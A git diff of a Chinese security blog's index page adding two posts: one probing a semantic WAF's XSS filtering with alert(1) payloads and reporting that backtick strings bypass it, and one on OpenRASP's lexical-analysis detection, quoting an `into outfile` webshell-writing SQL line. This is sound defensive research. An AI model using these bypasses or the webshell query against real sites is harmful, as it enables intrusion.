@@ -125,12 +125,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-count">61</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -159,6 +159,284 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(4)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(4)/" class="post-title-link" itemprop="url">细品某语义waf的xss防护(4)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>假设攻击场景如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">漏洞输出位置在JS环境中，如下面3种场景</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  var a&#x3D;&quot;用户输出可控位置&quot;;   &#x2F;&#x2F; 1</span><br><span class="line"></span><br><span class="line">  func(&quot;用户输出可控位置&quot;);   &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">  eval(&quot;用户输出可控位置&quot;);   &#x2F;&#x2F; 3</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这个场景下，验证厂商的安全防护策略</p>
+<p>分析思路</p>
+<ul>
+<li>判断支持哪几种引号的闭合</li>
+<li>对每类攻击场景单独测试，根据拦截情况推测安全防护策略</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="判断支持哪几种引号的闭合"><a href="#判断支持哪几种引号的闭合" class="headerlink" title="判断支持哪几种引号的闭合"></a>判断支持哪几种引号的闭合</h2><p>现代的Javascript支持三种方式表示字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a&#x3D;&#39;xx&#39;</span><br><span class="line">var a&#x3D;&quot;xx&quot;</span><br><span class="line">var a&#x3D;&#96;xx&#96;</span><br></pre></td></tr></table></figure>
+<p>因此同一个攻击场景会因为字符串写法细分成三类。</p>
+<p>测试payload是否被拦截</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#96;-alert(1)-&#96;   没有拦截     说明不支持拦截 var a&#x3D;&#96;&#96;-alert(1)-&#96;&#96;;  这种攻击</span><br><span class="line">&quot;-alert(1)-&quot;   拦截</span><br><span class="line">&#39;-alert(1)-&#39;   拦截</span><br></pre></td></tr></table></figure>
+
+<p>小结：</p>
+<ul>
+<li><p>支持单引号、双引号，不支持反引号</p>
+</li>
+<li><p>不支持防护下面的攻击场景</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a&#x3D;&#96;用户输出可控位置&#96;;</span><br><span class="line">func(&#96;用户输出可控位置&#96;);</span><br><span class="line">eval(&#96;用户输出可控位置&#96;);</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="单独测试"><a href="#单独测试" class="headerlink" title="单独测试"></a>单独测试</h2><ul>
+<li><p>var a=”用户输出可控位置”;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;xxx.alert(1);&#x2F;&#x2F;   拦截</span><br><span class="line">&quot;;xxx.xxalert(1);&#x2F;&#x2F;  不拦截</span><br></pre></td></tr></table></figure>
+
+<p>小结：</p>
+<ul>
+<li>解析js &amp;&amp; 存在”对象.函数()”形式或者”函数()”函数形式的函数调用 &amp;&amp; 函数名在黑名单中 则拦截</li>
+</ul>
+</li>
+<li><p>eval(‘用户输出可控位置’);</p>
+<p>漏洞利用时，如果不闭合引号</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">self[&quot;xxxx&quot;](1)    拦截</span><br><span class="line">selxfxx[&quot;alert&quot;](1)  不拦截</span><br><span class="line">selfxx[&quot;alert&quot;](1)  拦截</span><br><span class="line">self.xxx(1)    不拦截</span><br><span class="line"></span><br><span class="line">说明安全策略可能是：函数调用 &amp;&amp; 形式为&quot;对象[属性]()&quot; &amp;&amp; 对象名在黑名单中 (前缀匹配)</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用时，如果闭合引号，就和<code>func(&#39;用户输出可控位置&#39;)</code>攻击场景一样了</p>
+<p>小结：</p>
+<ul>
+<li>解析js &amp;&amp; 存在”对象.函数()”形式或者”函数()”函数形式的函数调用 &amp;&amp; 函数名是否在黑名单中   则拦截   (之前测试<code>&lt;svg/onload=&quot;用户输出点&quot;&gt;</code>场景得出结论，在这里也适用)</li>
+<li>解析js &amp;&amp; 函数调用 &amp;&amp; 形式为<code>对象[属性]()</code> &amp;&amp; 对象名在黑名单中 (前缀匹配)   则拦截</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>func(‘用户输出可控位置’);</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&#39;-alert(1)&#x2F;&#x2F;   拦截</span><br><span class="line">a&#x3D;&#39;-alert(1)-   拦截</span><br></pre></td></tr></table></figure>
+
+<p>小结： 解析js &amp;&amp; 存在”对象.函数()”形式或者”函数()”函数形式的函数调用 &amp;&amp; 函数名在黑名单中  则拦截</p>
+</li>
+</ul>
+<h2 id="不能解释的奇怪现象"><a href="#不能解释的奇怪现象" class="headerlink" title="不能解释的奇怪现象"></a>不能解释的奇怪现象</h2><ul>
+<li><p>测试过程中 <code>&quot;;alert(&#39;)</code> payload 被拦截</p>
+<p>按照我的经验，<code>&quot;;alert(&#39;)</code> payload无论对应到哪一类攻击场景都不会是正确的js语法，因此不应该被语义waf拦截。</p>
+<p>虽然 “;alert(‘)  payload在下面场景下可以弹框</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var a&#x3D;&quot;用户输出&#39;);   &#x2F;&#x2F; var a&#x3D;&quot;&quot;;alert(&#39;)&#39;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是几乎不可能有开发写出上面的代码。</p>
+<p>所以，有两个问题：</p>
+<ol>
+<li>这个payload是否有对应的漏洞场景？</li>
+<li>如果有对应的漏洞场景，对应的漏洞代码会长什么样？</li>
+</ol>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>可能的安全策略：<ul>
+<li>解析js &amp;&amp; 存在”对象.函数()”形式或者”函数()”函数形式的函数调用 &amp;&amp; 函数名在黑名单中  则拦截</li>
+<li>解析js &amp;&amp; 函数调用 &amp;&amp; 形式为<code>对象[属性]()</code> &amp;&amp; 对象名在黑名单中 (前缀匹配)   则拦截</li>
+</ul>
+</li>
+<li>有一些payload被拦截的原因目前无法解释</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E5%9C%A8%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E5%9C%A8%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">词法分析在安全产品中的应用</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>最近分析了一些waf、rasp等安全产品，发现核心检测逻辑非常依赖词法分析。</p>
+<p>总结一点东西：</p>
+<ul>
+<li>词法分析是什么？</li>
+<li>举个例子：OpenRASP怎么用到词法分析做安全策略？</li>
+<li>怎么实现词法分析？</li>
+<li>还有哪些安全防护产品用到词法分析？</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="词法分析是什么？"><a href="#词法分析是什么？" class="headerlink" title="词法分析是什么？"></a>词法分析是什么？</h2><p>词法分析可以将字符串按照自己的规则变成一串token。</p>
+<p>比如一个算术表达式 <code>1+2*3</code>，按照一定规则做词法分析后可以变成 <code>NUM ADD NUM MUL NUM</code> 一串token。</p>
+<p>编程语言在执行前也要做词法分析，比如Python词法分析结果是这样子的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python -m tokenize</span><br><span class="line">a&#x3D;1</span><br><span class="line"></span><br><span class="line">1,0-1,1:	NAME	&#39;a&#39;</span><br><span class="line">1,1-1,2:	OP	&#39;&#x3D;&#39;</span><br><span class="line">1,2-1,3:	NUMBER	&#39;1&#39;</span><br><span class="line">1,3-1,4:	NEWLINE	&#39;\n&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="安全产品怎么用到词法分析做安全策略？"><a href="#安全产品怎么用到词法分析做安全策略？" class="headerlink" title="安全产品怎么用到词法分析做安全策略？"></a>安全产品怎么用到词法分析做安全策略？</h2><p>拿OpenRASP举例，OpenRASP检测SQL注入、命令执行时核心检测算法非常依赖词法分析。</p>
+<ul>
+<li><p>先看看请求是怎么到检测插件的</p>
+<p>  OpenRASP可以作为PHP扩展保护PHP应用，在扩展被加载时hook了很多执行sql的函数，比如openrasp项目<code>agent/php5/hook/openrasp_mysqli.cc</code>文件中可以看到hook了mysqli模块的函数。</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * mysqli相关hook点</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">PRE_HOOK_FUNCTION(mysqli_query, SQL);</span><br><span class="line">POST_HOOK_FUNCTION(mysqli_query, SQL_ERROR);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>  当业务代码在做数据库查询时，如果调用<code>mysqli_query</code>等函数执行SQL，就会在执行SQL前经过OpenRASP的检测策略。</p>
+<p>  检测策略文件是JavaScript写的，代码位置在<code>plugins/official/plugin.js</code>。</p>
+<p>  在执行SQL注入检查时，会传入即将执行的SQL（如 “select * from users where a=1”）和完整的请求信息（包含请求参数）。</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">plugin.register(&#39;sql&#39;, function (params, context) &#123;  &#x2F;&#x2F;params.query包含完整sql，context包含完整请求</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>OpenRASP怎么做SQL注入检测？</p>
+<p>  SQL注入检测策略默认开启了三种：</p>
+<pre><code>* 词法分析后，判断用户输入是否改变SQL执行逻辑
+* 词法分析后，判断SQL语句是否有写文件操作、使用黑名单函数等
+* sql server执行异常</code></pre>
+<p>  第一类SQL注入检测策略：对即将执行的sql语句做分词，判断用户的输入占用了几个token，正常情况下，用户输入应该只占有一个token。 比如最终执行sql是select id from user where name=”user_input_name”， 正常请求时 “user_input_name” 会变成一个字符串token。如果碰到恶意请求闭合了双引号，用户输入就至少占用两个token。</p>
+<p>  详细可见官方文档 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/50AFAVp8dSwuc1ACY5kRKw">OpenRASP v0.20 发布 | 性能提升与零规则漏洞检测</a>。</p>
+<p>  实现的代码在 <code>plugins/official/plugin.js</code>文件</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; raw_tokens包含有词法分析得到的token串</span><br><span class="line">&#x2F;&#x2F; userinput_idx是用户输入在最终执行的sql的开始位置</span><br><span class="line"></span><br><span class="line">if (is_token_changed(raw_tokens, userinput_idx, value.length, distance, is_sql&#x3D;true)) &#123;</span><br><span class="line">    reason &#x3D; _(&quot;SQLi - SQL query structure altered by user input, request parameter name: %1%, value: %2%&quot;, [name, value])</span><br><span class="line">    return true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>  第二类SQL注入检测策略：检查分词后的token串中是否命中规则。</p>
+<p>  比如 为了对抗”利用SQL注入中写webshell”这种攻击方式，就检查最终执行的sql语句是否包含 [“into”,”outfile”]和[“into”,”dumpfile”] 两类token</p>
+<p>  <code>select &quot;webshell.txt&quot; into outfile &#39;/var/www/webshell.php&#39;</code> 可以用来写入Webshell</p>
+<p>  检测策略的实现代码也在 plugin.js 中可以看到</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">else if (features[&#39;into_outfile&#39;] &amp;&amp; i &lt; tokens_lc.length - 2 &amp;&amp; tokens_lc[i] &#x3D;&#x3D; &#39;into&#39;)</span><br><span class="line"> &#123;</span><br><span class="line">     if (tokens_lc[i + 1] &#x3D;&#x3D; &#39;outfile&#39; || tokens_lc[i + 1] &#x3D;&#x3D; &#39;dumpfile&#39;)</span><br><span class="line">     &#123;</span><br><span class="line">         reason &#x3D; _(&quot;SQLi - Detected INTO OUTFILE phrase in sql query&quot;)</span><br><span class="line">         break</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>  命令执行检测同样也依赖词法分析。</p>
+<p>  可以看出来OpenRASP中词法分析在sql注入、命令执行检测算法中目前很重要。</p>
+</li>
+</ul>
+<h2 id="怎么实现词法分析？"><a href="#怎么实现词法分析？" class="headerlink" title="怎么实现词法分析？"></a>怎么实现词法分析？</h2><p>OpenRASP有两个JS接口可以获取分析后的token串，见<a target="_blank" rel="noopener" href="https://rasp.baidu.com/doc/dev/api/rasp.html#sql_tokenize">sql_tokenize</a></p>
+<p>实现接口的代码在openrasp-v8项目中<code>base/flex/flex.cc</code>文件，这个文件是flex工具生成的，原始的规则文件并没有开源出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static sql_tokenize(query) &#123;</span><br><span class="line">    return tokenize(query, &quot;sql&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static cmd_tokenize(query) &#123;</span><br><span class="line">    return tokenize(query, &#39;bash&#39;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从实现角度上看，词法分词可以分为三类：</p>
+<ul>
+<li>借助工具，如flex、antlr。openrasp就是用借助flex做的</li>
+<li>纯手写实现，比如 <a target="_blank" rel="noopener" href="https://github.com/client9/libinjection">libinjection</a></li>
+<li>combinator库等半自动</li>
+</ul>
+<h2 id="哪些安全产品用到了词法分析？"><a href="#哪些安全产品用到了词法分析？" class="headerlink" title="哪些安全产品用到了词法分析？"></a>哪些安全产品用到了词法分析？</h2><ul>
+<li>openrasp</li>
+<li>waf<ul>
+<li>libinjection</li>
+<li>命令执行防护</li>
+<li>xss防护</li>
+<li>sql注入防护</li>
+</ul>
+</li>
+<li>hids<ul>
+<li>webshell检测</li>
+</ul>
+</li>
+<li>db防火墙</li>
+<li>代码混淆与反混淆</li>
+<li>…</li>
+</ul>
+<p>上面的部分产品除了用到词法分析，还会用到语法分析、语义分析。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是围绕OpenRASP来写的这篇文章，没有细讲词法分析的实现、做项目时应该用工具还是完全手写词法分析、语法分析这类检测引擎的误报和漏报场景等问题。</p>
+<p>关于词法分析、语法分析的原理、算法和实现，推荐看 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/intro/219">编译原理之美</a> 这个课程，一级棒。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1755588">OpenRASP SQL注入绕过</a></li>
+<li><a target="_blank" rel="noopener" href="https://rasp.baidu.com/">OpenRASP官网</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -305,106 +583,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E9%AA%8C%E8%AF%81%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E9%AA%8C%E8%AF%81%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">验证缺页中断机制</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在x86系列的cpu上开启分页机制后，指令涉及到”内存读写”操作时，用到的”内存地址”都是”虚拟地址”。”mmu硬件”会按照”分段”、”分页”的计算规则，将”虚拟地址”转换成”物理地址”。最终指令可以对”物理地址”读写数据。</p>
-<p>上面这段关于内存的”理论知识”，我觉得如果可以实践看一看，就能多一些”感觉”。</p>
-<p>本文记录我对下面两个结论的调试和验证过程，也是我对极客时间的<a target="_blank" rel="noopener" href="https://time.geekbang.org/column/intro/100078401?tab=catalog">操作系统实战 45 讲</a>课程中”内存管理”章节的部分学习和实践，基于<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson25~26/Cosmos">第26课代码</a>。</p>
-<p>“mmu硬件”在转换”虚拟地址”时有可能发生”缺页异常”，包括：</p>
-<ul>
-<li>访问”未向内核申请的虚拟地址”会导致”缺页异常”</li>
-<li>当第一次访问申请的虚拟地址时，也会产生”缺页异常”；第二次访问同样的虚拟地址时，不会产生”缺页异常”</li>
-</ul>
-<h1 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h1><ul>
-<li><p>访问”未向内核申请的虚拟地址”会导致”缺页异常”</p>
-<p>按照理论来说：访问未申请的虚拟地址时，”mmu硬件”在转换”虚拟地址”时会发出”缺页异常”（可能因为找不到对应的”页表项”）</p>
-<p>在验证这个理论前，先介绍一下cosmos(课程自制的内核系统名称)相关的代码，以方便读者大概理解文中出现的函数作用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void test_vadr()</span><br><span class="line">&#123;</span><br><span class="line">	adr_t vadr &#x3D; vma_new_vadrs(&amp;initmmadrsdsc, NULL, 0x1000, 0, 0);  &#x2F;&#x2F; 0x1000是想要申请的空间大小，vadr是申请的内存地址</span><br><span class="line">	if(NULL &#x3D;&#x3D; vadr)</span><br><span class="line">	&#123;</span><br><span class="line">		kprint(&quot;分配虚拟地址空间失败\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">  ...</span><br><span class="line">	hal_memset((void*)vadr, 0, 0x1000);  &#x2F;&#x2F; 初始化刚申请的内存为0</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>上面<code>test_vadr</code>是cosmos中用来验证”虚拟内存”相关功能的测试函数。</p>
-<p>在cosmos中，想要使用虚拟空间，需要先调用<code>vma_new_vadrs</code>申请一个虚拟地址。</p>
-<p>cosmos相关代码介绍完毕，下面用gdb调试课程代码，来实际验证一下”理论”：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break test_vadr   &#x2F;&#x2F; 在 test_vadr 函数下断点（选择在test_vadr函数下断点，是因为此时 虚拟内存管理、物理内存管理、缺页异常处理 等功能都已经实现）</span><br><span class="line">Breakpoint 1 at 0xffff80000202444a: file ..&#x2F;kernel&#x2F;krlvadrsmem.c, line 289.</span><br><span class="line">(gdb) continue</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, test_vadr () at ..&#x2F;kernel&#x2F;krlvadrsmem.c:289</span><br><span class="line">289	&#123;</span><br><span class="line">(gdb) break krluserspace_accessfailed   &#x2F;&#x2F; 在 krluserspace_accessfailed 函数下断点</span><br><span class="line">Breakpoint 2 at 0xffff800002026588: file ..&#x2F;kernel&#x2F;krlvadrsmem.c, line 1145.</span><br><span class="line">(gdb) call hal_memset(0x400,0,0x1)  &#x2F;&#x2F; 调用hal_memset函数，向 0x400地址 写一个字节内容</span><br><span class="line"></span><br><span class="line">Breakpoint 2, krluserspace_accessfailed (fairvadrs&#x3D;0) at ..&#x2F;kernel&#x2F;krlvadrsmem.c:1145 &#x2F;&#x2F;</span><br><span class="line">...</span><br><span class="line">(gdb) where   &#x2F;&#x2F; 可以看到 当前代码在..&#x2F;kernel&#x2F;krlvadrsmem.c文件1145行的krluserspace_accessfailed</span><br><span class="line">#0  krluserspace_accessfailed (fairvadrs&#x3D;0) at ..&#x2F;kernel&#x2F;krlvadrsmem.c:1145</span><br><span class="line">#1  0xffff8000020135d2 in hal_fault_allocator (faultnumb&#x3D;14, krnlsframp&#x3D;0xffff80000008fe18)</span><br><span class="line">    at ..&#x2F;hal&#x2F;x86&#x2F;halintupt.c:171</span><br><span class="line">#2  0xffff80000200d830 in exc_page_fault ()</span><br><span class="line">...</span><br><span class="line">(gdb) continue</span><br><span class="line">Continuing.</span><br><span class="line">^C      &#x2F;&#x2F; 因为在这里卡死了，所以我按了ctrl+c</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">hal_sysdie (errmsg&#x3D;0xffff80000203a237 &quot;缺页处理失败\n&quot;) at ..&#x2F;hal&#x2F;x86&#x2F;halcpuctrl.c:185</span><br><span class="line">185	        ;</span><br></pre></td></tr></table></figure>
-<p>从上面的调试信息可以看出来：cpu在执行<code>hal_memset</code>函数访问<code>0x400</code>虚拟地址时，跳到了<code>krluserspace_accessfailed</code>函数，最后卡死在<code>halcpuctrl.c</code>第185行</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/144075113-24fdf0f1-74ac-4223-9a09-d6c71ed0993a.png" alt="image"></p>
-<p>这里的<code>0x400</code>地址不是通过<code>vma_new_vadrs</code>申请的地址。</p>
-<p><code>krluserspace_accessfailed</code>函数只有cpu遇到中断并且中断号为14（也就是”缺页异常”）的时候才会被调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 异常处理</span><br><span class="line">void hal_fault_allocator(uint_t faultnumb, void *krnlsframp) &#x2F;&#x2F;eax,edx</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    if (faultnumb &#x3D;&#x3D; 14)        &#x2F;&#x2F; 缺页异常 中断号是14</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        if (krluserspace_accessfailed(fairvadrs) !&#x3D; 0)</span><br><span class="line">       &#123;</span><br><span class="line">           system_error(&quot;缺页处理失败\n&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>所以可以推测出来：访问<code>0x400</code>时，mmu硬件发出了”缺页中断”，接着cpu处理”缺页中断”就会到<code>krluserspace_accessfailed</code>函数，因为<code>krluserspace_accessfailed</code>函数处理”页表映射”失败，所以会调用<code>system_error</code>函数，最终执行<code>for循环</code>卡死。</p>
-<p>这样可以看出来理论没有问题。</p>
-</li>
-<li><p>访问”已申请的虚拟地址”</p>
